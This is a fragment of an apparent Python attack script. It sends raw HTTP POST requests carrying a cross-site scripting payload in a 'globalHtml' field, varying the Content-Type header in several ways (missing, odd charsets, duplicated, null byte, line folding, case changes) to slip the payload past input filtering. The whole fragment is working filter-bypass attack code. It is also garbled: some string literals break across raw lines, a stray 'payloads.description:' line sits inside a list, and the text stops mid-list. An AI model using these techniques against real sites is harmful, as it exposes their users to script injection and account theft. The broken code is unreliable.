# ═══════════════════════════════════════════════════════════════
# D. CONTENT-TYPE HEADER TRICKS
# ═══════════════════════════════════════════════════════════════
print("
--- D: Content-Type Header Tricks ---")

payload_body = f"globalHtml={urllib.parse.quote(XSS_SHORT)}".encode()

# D1: No Content-Type header at all
raw_req(
    b"POST / HTTP/1.1
Host: " + HOST.encode() + b"
"
    b"Content-Length: " + str(len(payload_body)).encode() + b"
"
    b"Connection: close

" + payload_body)

# D2: Content-Type with extra parameters
for ct in [
    'application/x-www-form-urlencoded; charset=utf-7
payloads.description:
application/x-www-form-urlencoded; charset=utf-16',
    'application/x-www-form-urlencoded; charset=utf-32',
    'application/x-www-form-urlencoded; charset=iso-2022-jp',
    'application/x-www-form-urlencoded; charset=euc-jp',
    'application/x-www-form-urlencoded; charset=shift_jis',
    'application/x-www-form-urlencoded; charset=windows-31j',
    'application/x-www-form-urlencoded; boundary=fake',
]:
    raw_req(
        b"POST / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n"
        b"Content-Type: " + ct.encode() + b"\r\n"
        b"Content-Length: " + str(len(payload_body)).encode() + b"\r\n"
        b"Connection: close\r\n\r\n" + payload_body)

# D3: Duplicate Content-Type headers
raw_req(
    b"POST / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n"
    b"Content-Type: text/plain\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Content-Length: " + str(len(payload_body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n" + payload_body)

raw_req(
    b"POST / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n"
    b"Content-Type: application/x-www-form-urlencoded\r\n"
    b"Content-Type: text/plain\r\n"
    b"Content-Length: " + str(len(payload_body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n" + payload_body)

# D4: Content-Type with null byte
raw_req(
    b"POST / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n"
    b"Content-Type: application/x-www-form-urlencoded\x00\r\n"
    b"Content-Length: " + str(len(payload_body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n" + payload_body)

# D5: Content-Type with line folding (obsolete but some parsers accept)
raw_req(
    b"POST / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n"
    b"Content-Type: application/\r\n x-www-form-urlencoded\r\n"
    b"Content-Length: " + str(len(payload_body)).encode() + b"\r\n"
    b"Connection: close\r\n\r\n" + payload_body)

for ct in ['APPLICATION/X-WWW-FORM-URLENCODED', 'Application/X-Www-Form-Urlencoded',
           'APPLICATION/JSON', 'Application/Json
